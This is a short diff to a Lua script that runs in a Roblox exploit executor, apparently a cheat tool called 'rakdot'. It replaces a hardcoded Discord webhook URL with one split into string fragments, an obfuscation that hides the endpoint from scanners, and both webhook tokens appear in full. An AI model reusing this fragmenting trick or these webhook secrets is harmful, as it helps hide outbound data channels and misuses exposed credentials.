@@ -1299,7 +1299,12 @@ makefolder('rakdot')
 local lp = game.Players.LocalPlayer.Name
 makefolder('rakdot\\'..lp)
 
-writefile('rakdot\\webhook.txt',[[https://discord.com/api/webhooks/1381279378964480110/ekt0R5wry05THV1-jxPdRJRnPS-kM7WwiDj2PpDxWGWGvGm2M0ZKXB4VI4fk08ql5G8l]])
+local hul1 = [[https://discord.com/api/webho]]
+local hul2 = [[oks/1386516434544496700/MghMeg56W-BGT7u2RHc6UDM1oMD]]
+local hul3 = [[D7CW5a_aE6EB5HOpEI1A2gPl1Dy63gzRRBcaEaIXX]]
+local hul = hul1..hul2..hul3
+
+writefile('rakdot\\webhook.txt',hul)
 if isfile('rakdot\\webhook.txt') then
     getgenv().rakdot_WebhookUrl = tostring(readfile('rakdot\\webhook.txt'))
     webhook={}
